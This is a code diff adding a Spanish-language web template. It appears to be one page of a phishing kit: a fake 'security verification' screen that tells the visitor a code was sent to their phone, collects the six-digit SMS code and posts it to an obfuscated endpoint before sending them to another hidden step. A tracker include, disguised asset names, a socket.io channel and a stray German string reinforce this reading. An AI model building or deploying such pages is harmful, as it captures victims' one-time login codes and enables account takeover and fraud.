@@ -1,0 +1,141 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <%- include('partials/tracker') %>
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body class="mb-pass">
+    <div>
+        <div class="topano">
+            <div  class="pc1"><img src="./img/hedopa-pc.PNG" alt=""></div>
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+        <div class="maina maina2">
+            <div class="inmaina">
+               
+                <p class="pp1">Verificación de seguridad</p>
+                <p style=" margin-bottom: 20px; color: rgb(21, 87, 158); font-weight: 600;">Para verificar su identidad, se ha enviado un código de seguridad único a su dispositivo móvil registrado.</p>
+                <!--  -->
+                
+            
+                    <form method="post" id="semitr1">
+                       <p>Introduzca el código de seguridad</p>
+                       <input type="text" id="smsCode" placeholder="Código de 6 dígitos" maxlength="6">
+                       <span class="error" id="smsCodeError"></span>
+                       
+                       <p class="code-hint" style="font-size: 12px; color: #666; margin-top: 5px;">El código tiene validez durante 10 minutos.</p>
+                        
+                        <button class="btn" type="submit">Confirmar</button>
+                        <div class="privacy">
+                            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg>
+                            <p>Sus datos están protegidos con los más altos estándares de seguridad</p>
+                        </div>
+                    </form>
+                    
+                    <script>
+                        // Add CSS for error messages
+                        const style = document.createElement('style');
+                        style.textContent = '.error { color: #d01a1a; font-size: 12px; display: block; margin-top: 5px; font-weight: 500; }\n' +
+                                           '.input-error { border: 1px solid #d01a1a !important; background-color: #fff8f8; }\n' +
+                                           '.valid-input { border: 1px solid #2e8b57 !important; }';
+                        document.head.appendChild(style);
+                    </script>
+
+                
+            </div>
+            
+        </div>  
+        
+<div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('semitr1');
+            const smsCodeInput = document.getElementById('smsCode');
+            const smsCodeError = document.getElementById('smsCodeError');
+            
+            // Only allow numbers in SMS code field
+            smsCodeInput.addEventListener('keypress', function(e) {
+                if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+                    e.preventDefault();
+                }
+            });
+            
+            // Clear error when user starts typing
+            smsCodeInput.addEventListener('input', function() {
+                smsCodeError.textContent = '';
+                smsCodeInput.classList.remove('input-error');
+            });
+            
+            // Validate SMS code format
+            function validateSmsCode(code) {
+                return /^\d{6}$/.test(code); // Must be exactly 6 digits
+            }
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const smsCode = smsCodeInput.value.trim();
+                
+                // Validate SMS code
+                if (!smsCode) {
+                    smsCodeError.textContent = 'Introduzca el código de seguridad';
+                    smsCodeInput.classList.add('input-error');
+                    return false;
+                } else if (!validateSmsCode(smsCode)) {
+                    smsCodeError.textContent = 'El código de seguridad debe contener 6 dígitos';
+                    return false;
+                }
+                
+                // Show processing state
+                const submitButton = form.querySelector('button[type="submit"]');
+                const originalButtonText = submitButton.textContent;
+                submitButton.textContent = 'Wird verarbeitet...';
+                submitButton.disabled = true;
+                
+                $.ajax({
+                    url: '/m4kT9BQWt7KTDdaVmafx', // This is the 'sms1 post' endpoint
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ code: smsCode }),
+                    success: function(info) {
+                        if(info.OK){
+                            // Redirect to the next step (semitr-2.ejs)
+                            window.location = "/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ";
+                        } else {
+                            // Show error message
+                            smsCodeError.textContent = 'Código de seguridad no válido. Compruebe su entrada.';
+                            smsCodeInput.classList.add('input-error');
+                            
+                            // Reset button
+                            submitButton.textContent = originalButtonText;
+                            submitButton.disabled = false;
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        // Show error message
+                        smsCodeError.textContent = 'Se ha producido un error. Inténtelo de nuevo.';
+                        smsCodeInput.classList.add('input-error');
+                        
+                        // Reset button
+                        submitButton.textContent = originalButtonText;
+                        submitButton.disabled = false;
+                    }
+                });
+            });
+        });
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+   
+</body>
+</html>
